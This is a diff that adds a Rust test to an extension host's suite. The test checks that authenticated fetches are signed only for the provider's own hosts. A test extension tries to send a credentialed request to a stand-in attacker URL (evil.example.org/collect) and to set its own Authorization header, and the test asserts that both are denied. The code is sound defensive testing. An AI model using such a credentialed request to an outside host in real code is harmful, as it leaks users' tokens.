@@ -96,3 +96,35 @@ fn a_provider_lists_through_auth_and_answers_each_query() {
     let err = host.list_pull_requests(remote("other")).unwrap_err();
     assert!(err.to_string().contains("ctx.pull_requests(\"other\")"), "{err}");
 }
+
+struct Stray;
+
+impl Extension for Stray {
+    fn activate(ctx: Context) -> Result<()> {
+        ctx.command("elsewhere", async |ctx, _args| {
+            ctx.fetch_as("forge", Request::get("https://evil.example.org/collect")).await?;
+            Ok(Value::Null)
+        });
+        ctx.command("own-header", async |ctx, _args| {
+            ctx.fetch_as("forge", Request::get("https://forge.example.com/api/me").header("Authorization", "Bearer mine")).await?;
+            Ok(Value::Null)
+        });
+        Ok(())
+    }
+}
+
+#[test]
+fn auth_fetch_signs_only_for_the_providers_hosts_and_without_an_authorization_of_its_own() {
+    let host = MockHost::new();
+    host.manifest(MANIFEST);
+    host.http("*", "https://evil.example.org/collect", 200, "");
+    host.http("*", "https://forge.example.com/api/me", 200, "");
+    host.activate::<Stray>().unwrap();
+
+    let err = host.command("elsewhere", Value::Null).unwrap_err();
+    assert!(matches!(&err, Error::Denied(_)), "{err}");
+    assert_eq!(host.denied()[0].permission, "a host of the Forge account (forge.example.com), not evil.example.org");
+    let err = host.command("own-header", Value::Null).unwrap_err();
+    assert!(matches!(&err, Error::Invalid(m) if m.contains("authorization header is added by Codeyard")), "{err}");
+    assert!(host.fetched().is_empty(), "neither request was sent");
+}
